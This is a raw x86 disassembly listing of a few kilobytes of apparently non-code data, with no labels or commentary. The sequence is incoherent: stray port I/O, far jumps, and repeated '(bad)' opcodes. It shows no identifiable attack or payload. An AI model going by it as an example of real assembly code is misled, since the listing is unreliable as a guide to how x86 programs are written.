  41db9c:	pop    ds
  41db9d:	pop    esp
  41db9e:	cdq    
  41db9f:	inc    esi
  41dba0:	out    0x3e,eax
  41dba2:	stc    
  41dba3:	clc    
  41dba4:	cmp    ch,BYTE PTR [esi+0x3eb81ab8]
  41dbaa:	dec    edx
  41dbab:	and    eax,0x22fb7c96
  41dbb0:	cwde   
  41dbb1:	mov    bh,ah
  41dbb3:	cmp    ah,al
  41dbb5:	dec    ecx
  41dbb6:	scas   eax,DWORD PTR es:[edi]
  41dbb7:	sub    bl,BYTE PTR [ecx-0x6d0c648f]
  41dbbd:	nop
  41dbbe:	jmp    0xf61b:0xe1148654
  41dbc5:	popf   
  41dbc6:	das    
  41dbc7:	xchg   edx,eax
  41dbc8:	push   esi
  41dbc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbca:	sar    BYTE PTR [ebx-0x43e3b9eb],cl
  41dbd0:	ret    
  41dbd1:	pop    ds
  41dbd2:	push   esi
  41dbd3:	add    BYTE PTR [esi],cl
  41dbd5:	mov    al,0x6
  41dbd7:	jbe    0x41dc4f
  41dbd9:	retf   
  41dbda:	mov    ah,0xc
  41dbdc:	call   0xeba22927
  41dbe1:	inc    esp
  41dbe2:	sub    BYTE PTR [eax-0x4b],0xeb
  41dbe6:	jno    0x41dc44
  41dbe8:	push   ss
  41dbe9:	hlt    
  41dbea:	pop    ebx
  41dbeb:	enter  0xd98f,0xd2
  41dbef:	mov    ecx,0x5d3a0856
  41dbf4:	cmp    DWORD PTR [ecx+0x5faa4338],edx
  41dbfa:	add    ch,BYTE PTR [ecx+0x2d]
  41dbfd:	jge    0x41dbac
  41dbff:	scas   al,BYTE PTR es:[edi]
  41dc00:	inc    esp
  41dc01:	cmc    
  41dc02:	icebp  
  41dc03:	add    eax,0x9289d069
  41dc08:	mov    ch,0x50
  41dc0a:	push   eax
  41dc0b:	and    eax,0xc9d83f14
  41dc10:	jbe    0x41dbdf
  41dc12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc13:	bound  esp,QWORD PTR [eax+0x18bde176]
  41dc19:	aas    
  41dc1a:	jmp    0x447b7175
  41dc1f:	cmp    al,BYTE PTR [eax+0x71]
  41dc22:	cmp    DWORD PTR [esi-0x68ff1498],ebx
  41dc28:	shl    BYTE PTR [eax+edi*1+0x76],cl
  41dc2c:	lods   eax,DWORD PTR ds:[esi]
  41dc2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc2e:	test   al,0x30
  41dc30:	out    0xe5,eax
  41dc32:	and    DWORD PTR [ebx+0x5f],0x6c
  41dc36:	sbb    edx,esi
  41dc38:	int    0x4f
  41dc3a:	xchg   esp,eax
  41dc3b:	dec    eax
  41dc3c:	sbb    al,0xf6
  41dc3e:	sti    
  41dc3f:	jle    0x41dc7e
  41dc41:	or     ecx,esp
  41dc43:	outs   dx,DWORD PTR ds:[esi]
  41dc44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc45:	enter  0xeeb0,0xec
  41dc49:	xor    DWORD PTR [ebp+eiz*4-0x5b411f73],esp
  41dc50:	icebp  
  41dc51:	retf   
  41dc52:	test   DWORD PTR [ebp+0x4033c673],0xf20af7a1
  41dc5c:	and    eax,0x255b481
  41dc61:	adc    al,0xb9
  41dc63:	nop
  41dc64:	and    eax,0x75cebaa9
  41dc69:	call   0xe305eaf3
  41dc6e:	sbb    ebx,DWORD PTR [esi-0x62be0789]
  41dc74:	into   
  41dc75:	push   esi
  41dc76:	mov    eax,ds:0x89bec9a8
  41dc7b:	push   edi
  41dc7c:	in     eax,dx
  41dc7d:	imul   ecx,DWORD PTR [ecx],0xffffff9f
  41dc80:	cmp    al,BYTE PTR [ebp+0x2aa1dc40]
  41dc86:	pop    es
  41dc87:	cs fcom st(4)
  41dc8a:	and    BYTE PTR [ebp+0x6ec08105],cl
  41dc90:	dec    edi
  41dc91:	sub    dl,al
  41dc93:	add    eax,0xcba3c5a2
  41dc98:	shl    BYTE PTR [edi],cl
  41dc9a:	mov    edx,0xcdcff729
  41dc9f:	outs   dx,BYTE PTR ds:[esi]
  41dca0:	cmp    bl,BYTE PTR [ecx+0x37]
  41dca3:	(bad)  
  41dca4:	xchg   edi,eax
  41dca5:	lea    esp,[ecx+eiz*8+0x66]
  41dca9:	mov    ds:0x73062a19,eax
  41dcae:	push   cs
  41dcaf:	mov    esp,DWORD PTR [ebx]
  41dcb1:	or     al,0xfa
  41dcb3:	jns    0x41dc81
  41dcb5:	mov    edx,0xc1acb6c4
  41dcba:	cmp    BYTE PTR [eax+0xc],0xb6
  41dcbe:	cmc    
  41dcbf:	xor    eax,0xebb48257
  41dcc4:	mov    edi,0x4462739e
  41dcc9:	stos   BYTE PTR es:[edi],al
  41dcca:	xor    eax,0x8bc3d0c7
  41dccf:	shr    ah,cl
  41dcd1:	jno    0x41dd1b
  41dcd3:	aam    0xf0
  41dcd5:	ins    BYTE PTR es:[edi],dx
  41dcd6:	fbstp  TBYTE PTR [esi-0x6d]
  41dcd9:	xor    BYTE PTR [ebp+0x1f],cl
  41dcdc:	push   ss
  41dcdd:	in     eax,0x28
  41dcdf:	retf   0xd80e
  41dce2:	xchg   ebp,eax
  41dce3:	fist   DWORD PTR [eax-0x6db76f08]
  41dce9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dceb:	jge    0x41dce6
  41dced:	push   edx
  41dcee:	or     dh,BYTE PTR [edi]
  41dcf0:	adc    DWORD PTR [eax-0x62],edi
  41dcf3:	mov    cl,BYTE PTR [edi-0x4a]
  41dcf6:	mov    eax,0x4229e857
  41dcfb:	and    BYTE PTR [ecx-0x422f0ced],dl
  41dd01:	jnp    0x41dd51
  41dd03:	int3   
  41dd04:	sub    DWORD PTR [edi+0x27],esi
  41dd07:	loopne 0x41dcc9
  41dd09:	cmp    esp,DWORD PTR [ecx+0x622ba189]
  41dd0f:	sbb    BYTE PTR [esi+edx*2-0x5ff596e2],0xf3
  41dd17:	ins    BYTE PTR es:[edi],dx
  41dd18:	xchg   ecx,eax
  41dd19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd1a:	std    
  41dd1b:	push   edx
  41dd1c:	add    DWORD PTR [eax-0x3d],0x22
  41dd20:	inc    edx
  41dd21:	cli    
  41dd22:	xchg   ebx,eax
  41dd23:	aaa    
  41dd24:	mov    edx,0x646d6657
  41dd29:	inc    edi
  41dd2a:	pop    eax
  41dd2b:	imul   ecx,DWORD PTR [edi+eax*8],0x7d48a8ba
  41dd32:	jg     0x41dd92
  41dd34:	mov    ebp,0x48cf01bb
  41dd39:	jb     0x41dce9
  41dd3b:	adc    al,0x87
  41dd3d:	js     0x41dcd4
  41dd3f:	mov    dh,0xf1
  41dd41:	jp     0x41dd1e
  41dd43:	push   ds
  41dd44:	je     0x41dd78
  41dd46:	add    BYTE PTR [edx-0x43],0xf4
  41dd4a:	ret    
  41dd4b:	sbb    BYTE PTR [edx-0x3f9807f9],bl
  41dd51:	retf   
  41dd52:	mov    dh,0x9f
  41dd54:	mov    bl,0x32
  41dd56:	xlat   BYTE PTR ds:[ebx]
  41dd57:	adc    al,0x5c
  41dd59:	(bad)  
  41dd5a:	fsub   QWORD PTR cs:[edi+0x3f3a3b74]
  41dd61:	popa   
  41dd62:	mov    ebp,0xde3c8bcb
  41dd67:	ret    0x46a6
  41dd6a:	push   edi
  41dd6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd6c:	test   eax,0xdf9a8a5f
  41dd71:	mov    ebp,0xa1237f19
  41dd76:	pop    eax
  41dd77:	jecxz  0x41dd81
  41dd79:	mov    esp,0x44c6dbd
  41dd7e:	jl     0x41dd1d
  41dd80:	push   cs
  41dd81:	aad    0x8e
  41dd83:	mov    dh,ah
  41dd85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd86:	repz mov ecx,DWORD PTR [esi+0x2c]
  41dd8a:	fs cmp eax,0xddd29cd5
  41dd90:	push   ds
  41dd91:	add    dl,bl
  41dd93:	(bad)  
  41dd94:	out    0xe7,eax
  41dd96:	lea    edi,[eax]
  41dd98:	and    eax,0x6b297afd
  41dd9d:	cmc    
  41dd9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd9f:	aad    0x53
  41dda1:	lods   al,BYTE PTR ds:[esi]
  41dda2:	repnz xor eax,0x5424b2e8
  41dda8:	call   0xb2980fbd
  41ddad:	sti    
  41ddae:	inc    ebx
  41ddaf:	jmp    DWORD PTR [edx]
  41ddb1:	jecxz  0x41dd4c
  41ddb3:	pop    edx
  41ddb4:	sbb    bl,BYTE PTR [edi-0x4717b5dd]
  41ddba:	pop    esi
  41ddbb:	push   ebp
  41ddbc:	and    DWORD PTR [esi],esi
  41ddbe:	sbb    al,0xd9
  41ddc0:	sub    dl,cl
  41ddc2:	out    dx,al
  41ddc3:	gs jo  0x41dd47
  41ddc6:	fs ret 0x320d
  41ddca:	int    0x26
  41ddcc:	sub    eax,DWORD PTR [edi]
  41ddce:	nop
  41ddcf:	ds test al,0x77
  41ddd2:	xchg   edx,eax
  41ddd3:	pop    esi
  41ddd4:	inc    ebp
  41ddd5:	outs   dx,DWORD PTR ds:[esi]
  41ddd6:	dec    esi
  41ddd7:	cmc    
  41ddd8:	mov    ds:0x97c1d853,al
  41dddd:	mov    esi,0xd4f17bc7
  41dde2:	test   eax,0x70d67935
  41dde7:	xchg   esi,eax
  41dde8:	xlat   BYTE PTR ds:[ebx]
  41dde9:	sub    eax,0x527cb5c7
  41ddee:	fwait
  41ddef:	mov    al,ds:0x36d0f5e0
  41ddf4:	add    BYTE PTR [edi-0x8cdfe51],al
  41ddfa:	(bad)  
  41ddfb:	cmp    edx,DWORD PTR [edi-0x79]
  41ddfe:	add    al,0x72
  41de00:	dec    edi
  41de01:	imul   DWORD PTR [ebp-0x6b0f5fb1]
  41de07:	into   
  41de08:	and    esi,DWORD PTR [ebp-0x638d8c34]
  41de0e:	neg    BYTE PTR [esi]
  41de10:	sbb    BYTE PTR [ebp-0x50c156f1],ah
  41de16:	xor    ecx,edi
  41de18:	mov    ch,0x95
  41de1a:	cmp    al,BYTE PTR [ebx+0x7a]
  41de1d:	out    dx,eax
  41de1e:	(bad)  [ecx+esi*1+0x644e4b6a]
  41de25:	add    bh,dh
  41de27:	push   es
  41de28:	and    DWORD PTR cs:[ebx-0x1e044cc7],edi
  41de2f:	pop    edi
  41de30:	ja     0x41de99
  41de32:	lock mov ebx,0xcd5b2f9b
  41de38:	gs mov cl,0xa
  41de3b:	fstp   DWORD PTR [edx-0x7b]
  41de3e:	push   es
  41de3f:	jle    0x41de64
  41de41:	lods   al,BYTE PTR ds:[esi]
  41de42:	in     eax,dx
  41de43:	nop
  41de44:	lahf   
  41de45:	(bad)  
  41de46:	int    0x2e
  41de48:	add    cl,al
  41de4a:	xor    esp,DWORD PTR ds:0x147b73c0
  41de50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de51:	mov    dl,bh
  41de53:	sub    eax,eax
  41de55:	nop
  41de56:	dec    esp
  41de57:	xlat   BYTE PTR ds:[ebx]
  41de58:	adc    eax,0x2bc6b401
  41de5d:	jle    0x41dea6
  41de5f:	mov    BYTE PTR [ecx+0x694ac2fc],dl
  41de65:	test   DWORD PTR [esi+eiz*4+0x74fb71f4],0xd437f02f
  41de70:	into   
  41de71:	adc    al,0xd0
  41de73:	lock pusha 
  41de75:	cs lds ecx,FWORD PTR ds:[edx+0x68]
  41de7a:	pop    es
  41de7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de7c:	jb     0x41de1d
  41de7e:	cs jg  0x41deaa
  41de81:	add    ebp,ecx
  41de83:	jbe    0x41de46
  41de85:	xchg   edi,eax
  41de86:	mov    edx,?
  41de88:	jecxz  0x41de98
  41de8a:	sub    al,0xed
  41de8c:	hlt    
  41de8d:	mov    BYTE PTR [ecx],cl
  41de8f:	mov    ebx,0x66c75c34
  41de94:	outs   dx,DWORD PTR ds:[esi]
  41de95:	adc    ecx,DWORD PTR ds:0xb247ac2f
  41de9b:	repz scas al,BYTE PTR es:[edi]
  41de9d:	test   BYTE PTR [ebp+0x42],dl
  41dea0:	jae    0x41df0d
  41dea2:	in     al,dx
  41dea3:	(bad)  
  41dea4:	mov    esp,0x9bdc3b2d
  41dea9:	push   esp
  41deaa:	jb     0x41dec3
  41deac:	cwde   
  41dead:	dec    eax
  41deae:	(bad)  
  41deaf:	jge    0x41deed
  41deb1:	sbb    BYTE PTR [edi-0x2c],bh
  41deb4:	add    DWORD PTR [ecx-0x23],esi
  41deb7:	add    eax,0xab8c26c9
  41debc:	pop    es
  41debd:	inc    esp
  41debe:	pop    esp
  41debf:	int    0xec
  41dec1:	sbb    al,0xfd
  41dec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dec4:	xchg   esi,eax
  41dec5:	or     BYTE PTR [ebx-0x64],al
  41dec8:	push   ebx
  41dec9:	arpl   WORD PTR [esp+edi*2+0x599ab353],ax
  41ded0:	cmc    
  41ded1:	dec    edi
  41ded2:	out    dx,al
  41ded3:	cdq    
  41ded4:	ror    BYTE PTR [edx+ecx*2+0x4a894c2],cl
  41dedb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dedc:	das    
  41dedd:	addr16 jg 0x41deb5
  41dee0:	fmul   QWORD PTR [bp+si+0x6e]
  41dee4:	ror    DWORD PTR [edi+0x3b5efcac],cl
  41deea:	hlt    
  41deeb:	add    eax,DWORD PTR [ebp-0x3741e10f]
  41def1:	stc    
  41def2:	mov    edi,DWORD PTR [eax+0x3]
  41def5:	jnp    0x41df54
  41def7:	xor    al,0x2
  41def9:	push   cs
  41defa:	or     bh,BYTE PTR [eax]
  41defc:	dec    ebx
  41defd:	xchg   edi,eax
  41defe:	inc    ecx
  41deff:	adc    BYTE PTR [ecx+0x484e9ec0],ah
  41df05:	mov    dl,0x40
  41df07:	cmp    ecx,DWORD PTR [eax+0x62]
  41df0a:	or     edi,DWORD PTR [ebp+0x6d]
  41df0d:	push   esi
  41df0e:	jb     0x41df63
  41df10:	sbb    eax,0x1063e94f
  41df15:	aas    
  41df16:	pop    esi
  41df17:	les    ebx,FWORD PTR [esi+0x70f8e69c]
  41df1d:	sbb    BYTE PTR [ebx],bh
  41df1f:	dec    ebp
  41df20:	test   dh,cl
  41df22:	xor    al,0xff
  41df24:	or     dl,dh
  41df26:	push   esi
  41df27:	cwde   
  41df28:	lahf   
  41df29:	xchg   ecx,eax
  41df2a:	aad    0xf0
  41df2c:	div    DWORD PTR [edi-0x480926e8]
  41df32:	ins    BYTE PTR es:[edi],dx
  41df33:	mov    dl,0x52
  41df35:	cmp    al,0x4a
  41df37:	iret   
  41df38:	inc    edx
  41df39:	adc    DWORD PTR [eax],0x6f
  41df3c:	mov    ebx,0x896bf506
  41df41:	push   edx
  41df42:	pop    eax
  41df43:	inc    edi
  41df44:	mov    esp,0x80cad239
  41df49:	jns    0x41df87
  41df4b:	jecxz  0x41df8b
  41df4d:	xchg   DWORD PTR [edi+edi*4+0xe70c920],ebx
  41df54:	jne    0x41dfc4
  41df56:	jbe    0x41df84
  41df58:	dec    ebx
  41df59:	in     eax,dx
  41df5a:	push   0x4572744f
  41df5f:	int    0x74
  41df61:	pop    esi
  41df62:	mov    ebp,0x837853dd
  41df67:	adc    al,0x1a
  41df69:	fnstenv [edx+0x28754607]
  41df6f:	mov    ds:0x15a2e81e,al
  41df74:	mov    BYTE PTR [ebp+eiz*2+0x2f403322],dh
  41df7b:	sbb    eax,0x9af08f1
  41df80:	cmp    al,ah
  41df82:	loopne 0x41df41
  41df84:	dec    BYTE PTR [esi+0x17]
  41df87:	or     dh,BYTE PTR [edi+ebp*1-0xd]
  41df8b:	mov    eax,DWORD PTR [ecx-0x33bb72be]
  41df91:	shr    bh,1
  41df93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df94:	fimul  DWORD PTR [edx+0x71]
  41df97:	ss clc 
  41df99:	iret   
  41df9a:	mov    al,0x97
  41df9c:	out    dx,eax
  41df9d:	xor    DWORD PTR [eax-0x75bc068f],edi
  41dfa3:	jmp    0xf0e4:0xdffca4dd
  41dfaa:	and    esp,DWORD PTR [eax-0x47]
  41dfad:	push   0x3834027b
  41dfb2:	loop   0x41e026
  41dfb4:	sub    al,0x39
  41dfb6:	lds    esi,FWORD PTR [edi+0x1c253514]
  41dfbc:	cli    
  41dfbd:	xchg   edi,eax
  41dfbe:	mov    ds:0xc752273b,eax
  41dfc3:	mov    esi,0x6f92ec1a
  41dfc8:	shl    DWORD PTR [edx-0x1cf86b51],1
  41dfce:	pop    ss
  41dfcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfd0:	adc    bh,BYTE PTR fs:[edx-0x38]
  41dfd4:	ins    DWORD PTR es:[edi],dx
  41dfd5:	adc    ch,0x2e
  41dfd8:	jbe    0x41dfc1
  41dfda:	sub    al,0xd4
  41dfdc:	jmp    0x41e002
  41dfde:	mov    ebx,0x74b2248b
  41dfe3:	loope  0x41df6d
  41dfe5:	rol    DWORD PTR [edx],0xd9
  41dfe8:	mov    eax,ds:0xaf82784
  41dfed:	jno    0x41df9c
  41dfef:	daa    
  41dff0:	push   esp
  41dff1:	div    edx
  41dff3:	repz sahf 
  41dff5:	fiadd  DWORD PTR [eax+0x44dc0143]
  41dffb:	lock fstp DWORD PTR [ebx+0x48f76c21]
  41e002:	cmp    al,0xc8
  41e004:	inc    esp
  41e005:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e006:	popa   
  41e007:	daa    
  41e008:	aaa    
  41e009:	sbb    DWORD PTR [ebx-0x58e5f835],ecx
  41e00f:	ret    0x8885
  41e012:	ror    ah,1
  41e014:	pop    es
  41e015:	jl     0x41e01f
  41e017:	stc    
  41e018:	nop
  41e019:	xchg   BYTE PTR [esi],dh
  41e01b:	mov    BYTE PTR [eax],cl
  41e01d:	or     al,0xf
  41e01f:	fidivr WORD PTR [esi]
  41e021:	push   ss
  41e022:	enter  0xf309,0xe3
  41e026:	loopne 0x41e068
  41e028:	sub    al,0x14
  41e02a:	call   0x516f8457
  41e02f:	jb     0x41dfbd
  41e031:	test   BYTE PTR [esi+0x2b73487d],dl
  41e037:	mov    ss,WORD PTR [edx]
  41e039:	(bad)  
  41e03a:	push   esi
  41e03b:	stos   BYTE PTR es:[edi],al
  41e03c:	outs   dx,DWORD PTR ds:[esi]
  41e03d:	or     eax,DWORD PTR [eax-0x55]
  41e040:	inc    ecx
  41e041:	xchg   DWORD PTR [edx+0x2],ecx
  41e044:	mov    ch,0xd6
  41e046:	cld    
  41e047:	cmp    dl,ch
  41e049:	inc    edx
  41e04a:	mov    bl,0x4b
  41e04c:	sub    DWORD PTR [esp+edi*1+0x16b23e61],esp
  41e053:	mov    al,BYTE PTR [esi]
  41e055:	pop    edx
  41e056:	pop    ss
  41e057:	add    esi,edx
  41e059:	pop    edi
  41e05a:	adc    ebp,DWORD PTR [edi-0x52]
  41e05d:	(bad)  [edi+0x447ec231]
  41e063:	je     0x41e043
  41e065:	add    cl,BYTE PTR [edx+0x67616cb4]
  41e06b:	add    DWORD PTR [ecx+0x23],ecx
  41e06e:	push   ebx
  41e06f:	int3   
  41e070:	push   es
  41e071:	xchg   edi,eax
  41e072:	cmp    dl,bl
  41e074:	sub    ah,BYTE PTR [edx+edx*4-0x5]
  41e078:	xchg   esi,eax
  41e079:	pop    edx
  41e07a:	popfw  
  41e07c:	inc    BYTE PTR ds:0xf375a761
  41e082:	xchg   BYTE PTR [eax+edx*8-0x4c],bl
  41e086:	xor    DWORD PTR [ebp-0x268aa53e],ecx
  41e08c:	mov    al,ss:0x29dd77c0
  41e092:	ja     0x41e0e1
  41e094:	dec    ecx
  41e095:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e096:	jo     0x41e04d
  41e098:	cli    
  41e099:	rol    BYTE PTR [ebp+0x32],cl
  41e09c:	xchg   BYTE PTR [ecx+ebx*1],dh
  41e09f:	or     eax,0x4e4757dd
  41e0a4:	or     ebx,DWORD PTR [eax+0x5a508d81]
  41e0aa:	add    edi,ebx
  41e0ac:	into   
  41e0ad:	dec    edx
  41e0ae:	scas   al,BYTE PTR es:[edi]
  41e0af:	(bad)  
  41e0b0:	bnd jo 0x41e10d
  41e0b3:	leave  
  41e0b4:	aad    0x54
  41e0b6:	aas    
  41e0b7:	xchg   ebx,eax
  41e0b8:	dec    esp
  41e0b9:	mov    ebx,0x59881f87
  41e0be:	shl    BYTE PTR [ecx],0xc5
  41e0c1:	mov    edi,DWORD PTR [ebx]
  41e0c3:	cmc    
  41e0c4:	xor    edx,DWORD PTR fs:[edx-0x2d]
  41e0c8:	and    eax,0x3cf7e7da
  41e0cd:	sbb    ebp,0x1f
  41e0d0:	jg     0x41e076
  41e0d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0d3:	test   eax,0xb3f36ca8
  41e0d8:	push   ebx
  41e0d9:	rcr    DWORD PTR [ecx+0x65],cl
  41e0dc:	dec    ebx
  41e0dd:	js     0x41e123
  41e0df:	and    DWORD PTR [ebp+eax*4+0x50],esp
  41e0e3:	std    
  41e0e4:	lds    ebx,FWORD PTR [ecx+ebx*8+0x30202fe3]
  41e0eb:	sti    
  41e0ec:	and    eax,ebp
  41e0ee:	aas    
  41e0ef:	scas   eax,DWORD PTR es:[edi]
  41e0f0:	dec    esp
  41e0f1:	and    DWORD PTR [esi+0x5c851ed2],0x549424f6
  41e0fb:	fdivr  st,st(1)
  41e0fd:	(bad)  
  41e0ff:	inc    ebx
  41e100:	repnz aas 
  41e102:	stc    
  41e103:	jl     0x41e16a
  41e105:	aam    0x64
  41e107:	fwait
  41e108:	aaa    
  41e109:	cdq    
  41e10a:	dec    eax
  41e10b:	sub    al,BYTE PTR [ebx-0x1694e15d]
  41e111:	adc    DWORD PTR [esi-0xdbd5313],edi
  41e117:	dec    eax
  41e118:	out    0x70,eax
  41e11a:	xor    DWORD PTR [ecx+ecx*8-0x23391b4b],ebx
  41e121:	xchg   ebx,eax
  41e122:	adc    ecx,DWORD PTR [ebp+0x59]
  41e125:	rcr    DWORD PTR [edx+0x3f],0x7a
  41e129:	mov    al,0x69
  41e12b:	mov    cl,0x1b
  41e12d:	sbb    ecx,DWORD PTR [edx-0x64e4b528]
  41e133:	mov    bl,BYTE PTR [ebp+0x4b]
  41e136:	jns    0x41e18f
  41e138:	inc    esi
  41e139:	inc    ecx
  41e13a:	shl    dh,0x58
  41e13d:	pop    esi
  41e13e:	push   ebx
  41e13f:	cmp    BYTE PTR [ecx+eax*4+0x2d4ed1f1],dh
  41e146:	call   0x9155:0x25c95121
  41e14d:	adc    eax,0xc506dc1d
  41e152:	test   eax,0x14b1fd85
  41e157:	push   edi
  41e158:	out    dx,al
  41e159:	js     0x41e16e
  41e15b:	sub    BYTE PTR [edx],0x24
  41e15e:	aad    0xeb
  41e160:	clc    
  41e161:	lahf   
  41e162:	aaa    
  41e163:	mov    dh,0x41
  41e165:	rcl    BYTE PTR [esi+0x2e],1
  41e168:	inc    edx
  41e169:	mov    esi,0x86c66de3
  41e16e:	mov    al,0xa7
  41e170:	xchg   esp,eax
  41e171:	mov    BYTE PTR [ebx+0x305f8ee],cl
  41e177:	and    al,dh
  41e179:	sahf   
  41e17a:	pop    esp
  41e17b:	pop    es
  41e17c:	mov    BYTE PTR [ecx-0x44],dh
  41e17f:	minps  xmm1,XMMWORD PTR [ebp+eax*1+0x3c]
  41e184:	mov    al,cl
  41e186:	fcom   DWORD PTR [edx+edi*1+0x58]
  41e18a:	cmc    
  41e18b:	mov    ds:0x1a798cfd,al
  41e190:	push   ebp
  41e191:	mov    ds:0xa00fff38,ax
  41e197:	daa    
  41e198:	cmp    ebp,DWORD PTR ss:[esp+ecx*1+0x35]
  41e19d:	pop    edi
  41e19e:	in     al,dx
  41e19f:	cmp    DWORD PTR [esi+0x11],0xffffffbd
  41e1a3:	shl    DWORD PTR [ecx+0x25d0962e],1
  41e1a9:	adc    bl,BYTE PTR [ecx-0x79]
  41e1ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1ad:	repnz adc dh,ch
  41e1b0:	imul   edi,DWORD PTR [edx+0x13],0xd
  41e1b4:	fcomp  QWORD PTR [ebx-0x45ce2e57]
  41e1ba:	and    DWORD PTR [ebx-0x6],ebx
  41e1bd:	xchg   esi,eax
  41e1be:	addr16 inc esp
  41e1c0:	push   eax
  41e1c1:	outs   dx,BYTE PTR ds:[esi]
  41e1c2:	push   esi
  41e1c3:	xchg   esp,ebp
  41e1c5:	push   eax
  41e1c6:	mov    ah,0x63
  41e1c8:	sbb    eax,0x6aaefaa2
  41e1cd:	mov    WORD PTR [eax],gs
  41e1cf:	add    si,ax
  41e1d2:	out    0xa4,eax
  41e1d4:	fmul   DWORD PTR [eax+0x12]
  41e1d7:	hlt    
  41e1d8:	cmp    esp,edx
  41e1da:	fucomi st,st(6)
  41e1dc:	push   cs
  41e1dd:	or     bl,bh
  41e1df:	xchg   al,al
  41e1e1:	fadd   DWORD PTR [ebp-0x8901fba]
  41e1e7:	popf   
  41e1e8:	addr16 xchg edi,eax
  41e1ea:	test   eax,0xaacb733f
  41e1ef:	mov    esp,0x846a9791
  41e1f4:	psrlw  mm2,QWORD PTR [edi+0x69]
  41e1f8:	aaa    
  41e1f9:	retf   
  41e1fa:	in     eax,dx
  41e1fb:	in     eax,0x22
  41e1fd:	sbb    DWORD PTR [ebx+0x3a61fe5f],eax
  41e203:	push   edi
  41e204:	mov    dh,0x20
  41e206:	or     esp,DWORD PTR [ecx]
  41e208:	jl     0x41e224
  41e20a:	(bad)  
  41e20c:	or     BYTE PTR [ebx],0x3
  41e20f:	lds    ecx,FWORD PTR [edi]
  41e211:	sub    al,0xba
  41e213:	adc    eax,0x28d542f6
  41e218:	ja     0x41e1da
  41e21a:	lock out dx,al
  41e21c:	mov    ds:0xbc279655,al
  41e221:	xchg   esp,eax
  41e222:	(bad)  
  41e223:	push   edx
  41e224:	dec    ebp
  41e225:	mov    ebx,0xc8f8bbf4
  41e22a:	adc    al,0x5a
  41e22c:	aaa    
  41e22d:	outs   dx,DWORD PTR ds:[esi]
  41e22e:	mov    ds:0x1349e992,al
  41e233:	sti    
  41e234:	mov    ds:0x65a9f313,al
  41e239:	sbb    cl,dh
  41e23b:	mov    eax,ds:0x97a6a55e
  41e240:	mov    WORD PTR [esi],?
  41e242:	sti    
  41e243:	push   es
  41e244:	push   eax
  41e245:	pop    esi
  41e246:	lock sub eax,0x1881c83b
  41e24c:	ror    eax,0xc8
  41e24f:	pop    ebx
  41e250:	cmc    
  41e251:	mov    ecx,0xce1515fa
  41e256:	fnstenv [edx]
  41e258:	pop    ebx
  41e259:	mov    al,0x9b
  41e25b:	push   ecx
  41e25c:	lods   eax,DWORD PTR ds:[esi]
  41e25d:	call   0xd6eb:0x6fa5e38b
  41e264:	xchg   edi,eax
  41e265:	addr16 retf 
  41e267:	mov    ch,0x61
  41e269:	les    ebp,FWORD PTR [ebx-0x67382d01]
  41e26f:	inc    edx
  41e270:	(bad)  
  41e271:	test   al,0x47
  41e273:	inc    ecx
  41e274:	mov    BYTE PTR [eax+ecx*4+0x37],ch
  41e278:	into   
  41e279:	xchg   edi,eax
  41e27a:	in     al,0x89
  41e27c:	inc    ebx
  41e27d:	ins    BYTE PTR es:[edi],dx
  41e27e:	mov    dl,0xf5
  41e280:	lock sbb al,0x87
  41e283:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e284:	popa   
  41e285:	pop    edi
  41e286:	xchg   DWORD PTR [ebx+edi*4-0x3a00e617],edx
  41e28d:	add    BYTE PTR [ecx+0x723969a7],0x69
  41e294:	mov    ds:0x1da7d04c,al
  41e299:	sbb    BYTE PTR [ebx],cl
  41e29b:	into   
  41e29c:	mov    ds:0xf8909cd1,al
  41e2a1:	lods   eax,DWORD PTR ds:[esi]
  41e2a2:	dec    ebp
  41e2a3:	(bad)  
  41e2a4:	jecxz  0x41e284
  41e2a6:	xor    al,cl
  41e2a8:	jge    0x41e323
  41e2aa:	inc    eax
  41e2ab:	int    0xfe
  41e2ad:	out    dx,al
  41e2ae:	push   cs
  41e2af:	ret    0xa234
  41e2b2:	sub    eax,eax
  41e2b4:	add    DWORD PTR [edi-0x29],edi
  41e2b7:	adc    dh,BYTE PTR [ebp+ebx*2+0x6c40b49]
  41e2be:	and    ebx,DWORD PTR [ebx+eax*1]
  41e2c1:	cli    
  41e2c2:	rcl    DWORD PTR [esp+ebp*4+0x33],0x89
  41e2c7:	daa    
  41e2c8:	jp     0x41e2a6
  41e2ca:	cmc    
  41e2cb:	fisub  DWORD PTR [edi+0x6f]
  41e2ce:	enter  0xb1f1,0x2a
  41e2d2:	aas    
  41e2d3:	jl     0x41e2e9
  41e2d5:	cmc    
  41e2d6:	lods   eax,DWORD PTR ds:[esi]
  41e2d7:	enter  0xdeeb,0xbc
  41e2db:	jle    0x41e35c
  41e2dd:	xchg   esp,eax
  41e2de:	bound  edi,QWORD PTR [edi+0x1557d0e4]
  41e2e4:	or     esi,0xffffffce
  41e2e7:	dec    ebp
  41e2e8:	pop    esi
  41e2e9:	inc    ecx
  41e2ea:	adc    ah,BYTE PTR [ebx-0x61]
  41e2ed:	fdiv   DWORD PTR [edi+0x53]
  41e2f0:	repz dec ebp
  41e2f2:	and    edi,DWORD PTR [esi-0x67]
  41e2f5:	cmp    BYTE PTR [eax+edx*8],dh
  41e2f8:	dec    esi
